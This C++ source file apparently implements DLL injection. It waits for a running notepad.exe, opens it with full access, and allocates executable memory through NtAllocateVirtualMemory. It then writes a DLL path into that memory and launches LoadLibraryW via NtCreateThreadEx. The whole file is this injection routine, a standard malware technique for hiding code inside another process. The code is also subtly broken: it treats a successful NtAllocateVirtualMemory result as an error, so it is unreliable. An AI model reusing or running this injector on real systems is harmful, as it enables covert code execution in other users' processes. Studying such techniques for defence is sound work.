#include <cstdio>
#include <unistd.h>
#include "../utils.h"
#include "../ntdllfunc.h"

DWORD WaitForNotepad() {
    DWORD dNotepadPid = 0;
    int i = 0;
    while (true) {
        printf("[-] Searching for notepad...\n");
        dNotepadPid = FindFirstNotepad();
        if (!dNotepadPid) {
            printf("[!] No notepad found! Waiting for round %d...\n", i++);
            sleep(5);
        }
        else break;
    }
    return dNotepadPid;
}

int main() {
    // Vars
    DWORD dNotepadPid = 0;
    HANDLE hNotepad = nullptr;
    HANDLE hRemoteThread;
    HMODULE hKernel32 = nullptr;
    HMODULE hNtDll = nullptr;
    PTHREAD_START_ROUTINE lpLoadLibAddr = nullptr;
    PVOID lpAllocatedMemory;
    LPFUN_NtCreateThreadEx lpCreateThreadEx;
    LPFUN_NtAllocateVirtualMemory lpAllocateVirtualMemory;
    auto * dRemotePid = (DWORD *) malloc(sizeof(DWORD));
    wchar_t cDllLocation[MAX_PATH] = LR"(C:\Users\Public\dlls\libbasicdll.dll)";
    unsigned int sSizeDllLocation = sizeof(cDllLocation);
    // Code
    dNotepadPid = WaitForNotepad();
    printf("[+] Found notepad.exe with PID %lu\n", dNotepadPid);
    if(!(hNotepad = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dNotepadPid))) goto error;
    printf("[+] Opened notepad.exe process\n");
    // Getting addresses
    if (!(hKernel32 = GetModuleHandle(TEXT("Kernel32")))) goto error;
    if (!(hNtDll = GetModuleHandle(TEXT("ntdll.dll")))) goto error;
    printf("[+] Found module handles\n");
    if (!(lpLoadLibAddr = (PTHREAD_START_ROUTINE) GetProcAddress(hKernel32, "LoadLibraryW"))) goto error;
    if (!(lpCreateThreadEx = (LPFUN_NtCreateThreadEx) GetProcAddress(hNtDll, "NtCreateThreadEx"))) goto error;
    if (!(lpAllocateVirtualMemory = (LPFUN_NtAllocateVirtualMemory) GetProcAddress(hNtDll, "NtAllocateVirtualMemory"))) goto error;
    printf("[+] Found function addresses\n");
    // Injecting
    if(!lpAllocateVirtualMemory(hNotepad, &lpAllocatedMemory, 0, (PULONG) &sSizeDllLocation, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) goto error;
    printf("[+] Allocated %u bytes in process\n", sSizeDllLocation);
    if(!WriteProcessMemory(hNotepad, lpAllocatedMemory, (LPVOID) cDllLocation, sSizeDllLocation, nullptr)) goto error;
    printf("[+] Payload injected\n");
//    CreateRemoteThread(hNotepad, nullptr, 0, lpLoadLibAddr, lpAllocatedMemory, 0, dRemotePid);
    lpCreateThreadEx(&hRemoteThread, 0x1FFFFF, nullptr, hNotepad, (LPTHREAD_START_ROUTINE) lpLoadLibAddr, lpAllocatedMemory, FALSE, 0, 0, 0, nullptr);
//    printf("[+] Remote thread started with PID %lu\n", *dRemotePid);
    CloseHandle(hNotepad);
    return EXIT_SUCCESS;
    // Kill everything
    error:
    if (hNotepad) CloseHandle(hNotepad);
    printError((GetLastError()));
    return EXIT_FAILURE;
}